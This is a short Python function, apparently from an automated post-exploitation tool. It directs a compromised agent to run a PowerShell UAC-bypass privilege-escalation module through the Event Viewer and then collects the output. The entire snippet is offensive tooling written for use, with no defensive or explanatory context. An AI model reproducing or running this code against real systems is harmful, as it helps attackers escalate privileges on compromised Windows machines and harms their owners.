async def crystallize(agent, listener="DeathStar"):
    output = await agent.execute(
        "powershell/privesc/bypassuac_eventvwr", options={"Listener": listener}
    )

    results = output["results"].strip()
    log.debug(results)
    return results
